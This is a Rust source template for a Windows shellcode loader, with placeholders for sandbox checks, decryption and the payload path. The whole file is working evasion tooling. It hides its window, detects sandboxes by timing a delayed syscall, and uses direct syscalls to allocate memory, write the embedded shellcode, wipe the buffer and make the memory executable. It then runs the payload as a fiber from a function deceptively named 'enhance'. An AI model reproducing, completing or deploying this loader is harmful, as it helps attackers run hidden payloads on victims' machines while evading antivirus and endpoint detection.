#![windows_subsystem = "windows"]
#![allow(non_snake_case)]

use std::ptr::null_mut;
use std::time::Instant;

use ntapi::ntpsapi::NtCurrentProcess;
use rust_syscalls::syscall;
use winapi::ctypes::c_void;
use winapi::{
    shared::ntdef::NT_SUCCESS,
    um::winnt::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ, PAGE_READWRITE},
};
use windows_sys::Win32::System::Threading::{
    ConvertThreadToFiber, CreateFiberEx, SwitchToFiber, LPFIBER_START_ROUTINE,
};

use std::include_bytes;

{{SANDBOX_IMPORTS}}

{{IMPORTS}}

{{DECRYPTION_FUNCTION}}

fn pause(ms: i64) {
    unsafe {
        let interval: i64 = -(ms * 10_000);
        let _ = syscall!("NtDelayExecution", 0u32, &interval as *const i64);
    }
}

fn check_environment() -> bool {
    let start = Instant::now();
    pause(3000);
    start.elapsed().as_millis() >= 2500
}

fn wipe(buf: &mut Vec<u8>) {
    for b in buf.iter_mut() {
        unsafe { std::ptr::write_volatile(b as *mut u8, 0); }
    }
    buf.clear();
}

fn enhance(mut buf: Vec<u8>) {
    unsafe {
        let buf_len = buf.len();

        let mut region_base: *mut c_void = null_mut();
        let mut region_size: usize = buf_len;
        let status = syscall!("NtAllocateVirtualMemory", NtCurrentProcess, &mut region_base, 0_usize, &mut region_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if !NT_SUCCESS(status) { return; }

        pause(150);

        let mut bytes_written: usize = 0;
        let src = buf.as_mut_ptr() as *mut c_void;
        let status = syscall!("NtWriteVirtualMemory", NtCurrentProcess, region_base, src, buf_len, &mut bytes_written);
        if !NT_SUCCESS(status) { return; }

        wipe(&mut buf);

        pause(200);

        let mut old_protect: u32 = 0;
        let mut protect_size: usize = buf_len;
        let status = syscall!("NtProtectVirtualMemory", NtCurrentProcess, &mut region_base, &mut protect_size, PAGE_EXECUTE_READ, &mut old_protect);
        if !NT_SUCCESS(status) { return; }

        pause(100);

        let fiber_func: LPFIBER_START_ROUTINE = std::mem::transmute(region_base);
        let shellcode_fiber = CreateFiberEx(0, 0, 0, fiber_func, null_mut());
        if shellcode_fiber.is_null() { return; }

        let main_fiber = ConvertThreadToFiber(null_mut());
        if main_fiber.is_null() { return; }

        SwitchToFiber(shellcode_fiber);
    }
}

fn main() {
    {{SANDBOX}}

    if !check_environment() { return; }

    let buf = include_bytes!({{PATH_TO_SHELLCODE}});
    let mut vec: Vec<u8> = buf.to_vec();

    {{MAIN}}

    enhance(vec);
}

{{DLL_MAIN}}